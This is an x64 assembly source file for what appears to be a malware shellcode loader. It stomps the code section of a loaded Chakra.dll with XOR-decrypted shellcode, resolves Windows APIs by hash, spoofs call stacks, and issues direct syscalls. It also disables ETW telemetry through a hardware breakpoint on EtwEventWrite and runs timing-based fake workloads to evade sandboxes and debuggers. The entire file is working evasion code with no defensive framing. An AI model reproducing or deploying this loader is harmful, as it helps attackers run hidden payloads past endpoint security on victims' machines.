
include evader.inc

extern SHELLSIZE:abs
extern KEYSIZE:abs

.data

public szNtdll
szNtdll dw 6eh, 74h, 64h, 6ch, 6ch, 2eh, 64h, 6ch, 6ch, 00
public szK32
szK32 dw 4Bh, 45h, 52h, 4Eh, 45h, 4Ch, 33h, 32h, 2Eh, 64h, 6Ch, 6Ch, 00
szDllName dw 43h, 68h, 61h, 6Bh, 72h, 61h, 2Eh, 64h, 6Ch, 6Ch, 00
ulSpeed dq 00
extern sc:byte
extern key:byte
extern hNtDll:qword
extern hThread:qword
extern dwProcId:dword
extern dwThreadId:dword

.code 

; This procedure exits AsmLdr if the process being debugged
public ldr_exit
ldr_exit proc
	add rsp, 520h                  ; Get rid of reserved memory
	pop rbp                        ; Get the previous stack base
	ret                            ; Jump into the caller of the main directly
ldr_exit endp

public hollow
hollow proc
	lea rcx, szNtdll               ; RCX => Pointer to L"ntdll.dll"
	call resolve_module            ; Get a handle on ntdll
	push rax                       ; Save hNtDLL

	; resolve_api( hNtDLL, hashof("LdrLoadDll") )
	mov rcx, rax
	mov rdx, 726C7A370307DB23h
	call resolve_api
	;------------------------------
	
	mov rcx, qword ptr [rsp]       ; ntdll module handle
	mov rdx, 27FF247029B75F89h     ; hashof( "RtlInitUnicodeString" ) 
	push rax                       ; Save LdrLoadDll address
	call resolve_api

	sub rsp, 10h                   ; Allocate memory for UNICODE_STRING
	mov rcx, rsp                   ; RCX => &DestinationString
	lea rdx, szDllName             ; RDX => L"Chakra.dll"
	push rax                       ; Pass `RtlInitUnicodeString` address to spoof call
	call SpoofCall                 ; Spoof a call to RtlInitUnicodeString
	lea r8, qword ptr [rsp]        ; A pointer to the unicode string read from the function
	
	mov rax, qword ptr [rsp + 10h] ; LdrLoadDll address
	xor rcx, rcx                   ; PathToFile = NULL
	xor rdx, rdx                   ; Flags = 0
	push 0h                        ; Allocate a space for ModuleHandle
	mov r9, rsp                    ; A pointer to the ModuleHandle
	push 0h                        ; Alignment
	push rax                       ; Prepare for the spoof
	call SpoofCall
	pop rdx                        ; F*cking alignment
	pop rdx                        ; ModuleHandle that we read from the API
	add rsp, 18h
	cmp rax, 00h
	jl hollow_fail
	test rdx, rdx
	jz hollow_fail

	add rdx, 1000h                 ; Hollowed DLL Base Address + 0x1000 = RX section (.text)
	push rdx                       ; Save two copies because the API may manipulate the one it takes
	push rdx                       
	push SHELLSIZE

	; Get NtProtectVirtualMemory API Address
	mov rcx, qword ptr [rsp + 18h] ; ntdll module handle
	mov rdx, 80E0D54F082962C8h     ; API hash
	call resolve_api
	
	; Get the SSN of that call
	mov rcx, rax
	call resolve_ssn
	
	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	mov rcx, -1                    ; Current process
	lea rdx, qword ptr [rsp + 8h]  ; &BaseAddress 
	lea r8, qword ptr [rsp]        ; &NumberOfBytesToProtect 
	mov r9, 04h                    ; NewAccessProtection = PAGE_READWRITE
	push 0h                        ; Allocate memory for OldAccessProtection
	push rsp                       ; Pass &OldAccessProtection as a parameter to the API
	call SysCallExec

	cmp eax, 0h
	jge prot_change_success
	add rsp, 20h
	jmp hollow_fail

	prot_change_success:
	; 1 - Move the encryptyed shellcode into the Hollowed DLL executable section 
	push rsi
	push rdi
	lea rsi, sc
	mov rdi, qword ptr [rsp + 28h] ; Hollowed DLL Address (.text section)
	mov rcx, SHELLSIZE
	rep movsb
	pop rdi
	pop rsi

	; 2 - Decrypt the shellcode inside the Hollowed DLL
	mov rcx, qword ptr [rsp + 18h] ; Hollowed DLL Address (.text section)
	call deobf_sc
	;----------------------------------------

	; Change the DLL .TEXT section back to RX since we are done writing our shellcode there
	mov rcx, -1
	lea rdx, qword ptr [rsp + 18h]
	lea r8, qword ptr [rsp + 10h]
	mov r9, qword ptr [rsp + 08h]
	call SysCallExec

	add rsp, 20h
	cmp eax, 0h
	pop rax
	jl hollow_fail

	hollow_finish:
	pop rdx                        
	ret

	hollow_fail:
	xor rax, rax
	jmp hollow_finish
hollow endp

public f_ckoff_etw
f_ckoff_etw proc
	mov rax, hThread
	test rax, rax
	jnz etw_skip_get_thread
	sub rsp, 40h                   ; Memory for OBJECT_ATTRIBUTES and CLIENT_ID
	lea rcx, szK32                 ; RCX => Pointer to L"KERNEL32.dll"
	call resolve_module            ; Get a handle on KERNEL32
	push rax

	; resolve_api( hKernel32, hashof("GetCurrentProcessId") )
	mov rcx, rax
	mov rdx, 0D30B3BA2A3BF64B4h
	call resolve_api
	push rax
	call SpoofCall
	mov dwProcId, eax
	;------------------------------

	; resolve_api( hKernel32, hashof("GetCurrentThreadId") )
	mov rcx, qword ptr [rsp]
	mov rdx, 3CB2C3E3D29E428Dh
	call resolve_api
	push rax
	call SpoofCall
	mov dwThreadId, eax
	;------------------------------

	pop rax

	; Fills obj_attrs and client_id with zeros
	push rdi
	lea rdi, qword ptr [rsp + 8h]
	cld
	mov rcx, 40h
	xor al, al
	rep stosb
	pop rdi
	;-------------

	; resolve_api( hNtDLL, hashof("NtOpenThread") )
	mov rcx, hNtDll
	mov rdx, 0C12C7B44FB8A31D1h
	call resolve_api
	;------------------------------

	mov rcx, rax
	call resolve_ssn

	; Prepare for the call
	mov cx, ax
	call PrepareSysCall            ; Hell gate
	lea rcx, hThread
	mov rdx, 001F03FFh             ; THREAD_ALL_ACCESS
	mov r8, rsp                    ; obj_attrs
	mov qword ptr [r8], 30h        ; obj_attrs->Length = 0x30
	lea r9, qword ptr [rsp + 30h]  ; client_id
	mov eax, dwProcId
	mov dword ptr [r9], eax
	mov eax, dwThreadId
	mov dword ptr [r9 + 8h], eax
	call SysCallExec
	cmp eax, 0h
	jl f_ckoff_etw_finish
	add rsp, 40h
	
	etw_skip_get_thread:
	; resolve_api( hNtDLL, hashof("RtlAddVectoredExceptionHandler") )
	mov rcx, hNtDll
	mov rdx, 0B236009C554BAFA9h
	call resolve_api
	;------------------------------
	; RtlAddVectoredExceptionHandler( First = TRUE, Handler = &k_ckoff_etw )
	mov rcx, 1
	lea rdx, qword ptr [k_ckoff_etw]
	push rax
	call SpoofCall
	test rax, rax
	jz f_ckoff_etw_finish
	HARADWARE_BREAKPOINT HWBP_ADD  ; Add Hardware Breakpoint on EtwEventWrite
	f_ckoff_etw_finish:
	ret
f_ckoff_etw endp

; A breakpoint handler that intercepts `EtwEventWrite` 
k_ckoff_etw proc
	push rcx
	xor rax, rax
	mov rdx, qword ptr [rcx]
	cmp dword ptr [rdx], 80000004h
	push rax
	; resolve_api( hNtDLL, hashof("EtwEventWrite") )
	mov rcx, hNtDll
	mov rdx, 173CBAAC24A8D022h
	call resolve_api
	xchg rax, r8
	pop rax
	mov rcx, qword ptr [rsp]
	mov rdx, qword ptr [rcx]
	cmp qword ptr [rdx + 10h], r8
	jne handler_end
	; HARADWARE_BREAKPOINT HWBP_DEL  ; Delete the breakpoint so that we do not fall into the f*cking hell loop if we called it from here
	mov rcx, qword ptr [rsp]
	mov rdx, qword ptr [rcx + 8h]  ; Context Record
	lea r8, qword ptr [rdx + 98h]
	mov r9, qword ptr [r8]         ; Get the Stack Pointer
	mov r9, qword ptr [r9]         ; Get return address (RSP references the return address)
	add qword ptr [r8], sizeof qword ; Addjust the stack (Remove return address) because we will resume the caller function
	mov qword ptr [rdx + 0f8h], r9 ; Set the return address to the instruction pointer register
	; HARADWARE_BREAKPOINT HWBP_ADD  ; Add the breakpoint again
	xor rax, rax
	not rax
	handler_end:
	pop rcx
	ret
k_ckoff_etw endp

; Deobfuscate shellcode
; Input => RCX -> shellcode address
deobf_sc proc
	push rbx
	push rsi
	mov rbx, KEYSIZE                 ; RBX => Decryption key length
	mov rsi, rcx                     ; RSI => Points to the shellcode
	xor rcx, rcx                     ; RCX will be used as an index to deref shellcode
	next_byte:
	mov rax, rcx                     ; We need to do cyclic iteration over the key
	cqo                              ; sign-extend into RDX
	idiv rbx                         ; RDX => Correct index of the next byte in the key array
	lea rax, key                     ; RAX => Points to the first byte in the key array
	mov al, byte ptr [rax + rdx]     ; Get the desired value
	xor byte ptr [rsi + rcx], al     ; Get the original byte
	inc rcx                          ; Jump into the next byte
	cmp rcx, SHELLSIZE               ; Are we done?
	jne next_byte                    ; Repeat the shit if not
	pop rsi
	pop rbx
	ret
deobf_sc endp

public fake_workload
fake_workload proc
	push rbx
	push rcx
	mov rax, 4h
	mul rcx
	mov rbx, rax
	call get_cpuspeed
	mul rbx
	mov rbx, rax
	start_work:
	GET_TSC
	push rax
	busy_work:
	JUNK_TO_BAFFLE
	GET_TSC
	sub rax, qword ptr [rsp]
	cmp rax, rbx
	jl busy_work
	pop rax
	dec dword ptr [rsp]
	mov ecx, dword ptr [rsp]
	test ecx, ecx
	jnz start_work
	pop rcx
	pop rbx
	xor rax, rax
	ret
fake_workload endp

public start_fake_workload
start_fake_workload proc
	lea rcx, szK32                 ; RCX => Pointer to L"KERNEL32.dll"
	call resolve_module            ; Get a handle on KERNEL32
	; resolve_api( hKernel32, hashof("CreateThread") )
	mov rcx, rax
	mov rdx, 0B96DF9CF7F08F451h
	call resolve_api
	; CreateThread( 
	;	lpThreadAttributes	= NULL,
	;	dwStackSize			= 0x00,
	;	lpStartAddress		= &fake_workload,
	;	lpParameter			= 0x0F,
	;	dwCreationFlags		= 0x00,
	;	lpThreadId			= NULL
	; )
	xor rcx, rcx
	xor rdx, rdx
	lea r8, qword ptr [fake_workload]
	mov r9, 0Fh
	push 00h
	push 00h
	push rax
	call SpoofCall
	add rsp, 10h
	ret
start_fake_workload endp

public calm_before_storm
calm_before_storm proc
	lea rcx, szK32                 ; RCX => Pointer to L"KERNEL32.dll"
	call resolve_module            ; Get a handle on KERNEL32
	; resolve_api( hKernel32, hashof("SwitchToThread") )
	mov rcx, rax
	mov rdx, 12C142C3D8342D2h
	call resolve_api
	push rax
	call SpoofCall
	ret
calm_before_storm endp

get_cpuspeed proc
	mov rax, ulSpeed
	test rax, rax
	jnz get_speed_done
	GET_TSC
	push rax
	lea rcx, szK32                 ; RCX => Pointer to L"KERNEL32.dll"
	call resolve_module            ; Get a handle on KERNEL32
	; resolve_api( hKernel32, hashof("Sleep") )
	mov rcx, rax
	mov rdx, 310E19E5FEh
	call resolve_api
	mov rcx, 100
	push rax
	call SpoofCall
	GET_TSC
	pop rdx
	sub rax, rdx
	mov ulSpeed, rax
	get_speed_done:
	ret
get_cpuspeed endp

end